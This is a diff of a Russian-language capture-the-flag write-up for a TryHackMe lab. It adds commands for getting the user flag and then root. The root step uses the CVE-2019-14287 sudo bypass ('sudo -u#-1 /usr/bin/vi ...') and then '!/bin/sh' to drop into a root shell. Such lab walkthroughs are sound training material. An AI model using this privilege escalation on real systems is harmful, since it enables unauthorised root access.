@@ -96,7 +96,7 @@ http://your_machine_ip/sup3r_s3cr3t_fl4g.php
 
 Описание не врало, там действительно находится Hot_Babe
 
-## Компрометация машины
+## Компрометация машины, поиск User flag
 
 Cкачаем данное изображение и проверим его при помощи утилиты strings
 
@@ -221,22 +221,80 @@ locate user.txt
 
 Попробуем прочитать его
 
+```console
+cat home/gwendoline/user.txt
+```
+
 ![cat-user](screenshots/25.png)
 
-eli не имеет к нему доступа, вероятно стоит попробовать учетную запись gwendoline
+В доступе отказано, eli не имеет к нему доступа, вероятно стоит попробовать учетную запись gwendoline
+
+```console
+su gwendoline
+```
 
 ![gwen-log](screenshots/26.png)
 
 Мы успешно вошли, попробуем снова прочитать user.txt
 
+```console
+cat home/gwendoline/user.txt
+```
 ![cat-user2](screenshots/27.png)
+
+Мы получили User flag! 
+
+## Поиск Root flag
+
+Посмотрим, можем ли мы выполнять команды от sudo
+
+```console
+sudo -l
+```
+
 ![cat-user2](screenshots/28.png)
+
+Монжно запустить /usr/bin/vi  /home/gwendoline/user.txt любым пользователем, кроме рута, без пароля. Выглядит ненадежно, стоит поискать уязвимости.
+
+Но для сначала выясним версию sudo
+
+```console
+sudo -V
+```
+
+
 ![cat-user2](screenshots/29.png)
+
+Ищем уязвимость
+
 ![cat-user2](screenshots/30.png)
+
+Находим CVE-2019-14287
+
 ![cat-user2](screenshots/31.png)
+
+Эксплуатируем данную уязвимость
+
+```console
+sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
+```
 ![cat-user2](screenshots/32.png)
+
+Успешно
+
 ![cat-user2](screenshots/33.png)
+
+Продолжаем
+
+```console
+!/bin/sh
+```
+
 ![cat-user2](screenshots/34.png)
+
+![cat-user2](screenshots/35.png)
+
+![cat-user2](screenshots/36.png)
 
 
 [^1]:https://tryhackme.com/room/yearoftherabbit#
